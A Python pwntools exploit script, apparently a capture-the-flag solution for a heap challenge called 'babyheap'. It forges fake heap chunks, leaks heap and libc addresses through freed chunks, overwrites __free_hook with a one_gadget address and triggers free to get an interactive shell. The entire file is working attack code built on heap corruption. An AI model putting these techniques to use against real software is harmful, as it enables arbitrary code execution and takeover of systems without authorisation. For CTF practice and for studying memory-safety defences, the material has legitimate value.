from pwn import *
context.log_level = 'debug'
p = process('./babyheap')
elf = ELF('./babyheap')
libc = ELF('./libc.so.6')

def Add(index, data):
    p.recvuntil('Choice:')
    p.sendline('1')
    p.recvuntil('Index:')
    p.sendline(str(index))
    p.recvuntil('Content:')
    p.send(data)

def Edit(index, data):
    p.recvuntil('Choice:')
    p.sendline('2')
    p.recvuntil('Index:')
    p.sendline(str(index))
    p.recvuntil('Content:')
    p.send(data)

def Show(index):
    p.recvuntil('Choice:')
    p.sendline('3')
    p.recvuntil('Index:')
    p.sendline(str(index))

def Delete(index):
    p.recvuntil('Choice:')
    p.sendline('4')
    p.recvuntil('Index:')
    p.sendline(str(index))



Add(0,'aaaaaaaa\n')
Add(1,'bbbbbbbb\n')
Add(2,'cccccccc\n')
Add(3,'dddddddd\n')

#--------------leak heap addr----------------
Add(4, p64(0xa0) + p64(0x31) + p64(0x602080 - 0x18) + p64(0x602080 - 0x10))
Add(5, p64(0x30) + p64(0x30) + '\n')



Delete(1)
Delete(0)

Show(0)
heap_addr = u64(p.recvline()[ : -1].ljust(8, '\x00')) - 0x30
log.success('heap_addr:{}'.format(hex(heap_addr)))
gdb.attach(p)

# # leak libc
Edit(0, p64(heap_addr + 0x20) + p64(0) + p64(0) + p64(0x31))

#gdb.attach(p)

Add(6, p64(0) + p64(0xa1) + '\n')
Add(7, p64(0) + p64(0xa1) + '\n')

#gdb.attach(p)
# leak libc
Delete(1)
Show(1)
libc_address = u64(p.recvline()[ : -1].ljust(8, '\x00'))-0x3c4b78
log.success('libc_addr:{}'.format(hex(libc_address)))

gdb.attach(p)
one_gadget = 0x45216

log.success("free_hook: "+hex(libc_address+ 0x3c67a8))
Edit(4,p64(libc_address + 0x3c67a8) + '\n')
Edit(1, p64(libc_address + one_gadget)[:-1] + '\n')

gdb.attach(p)
Delete(1)

p.interactive()
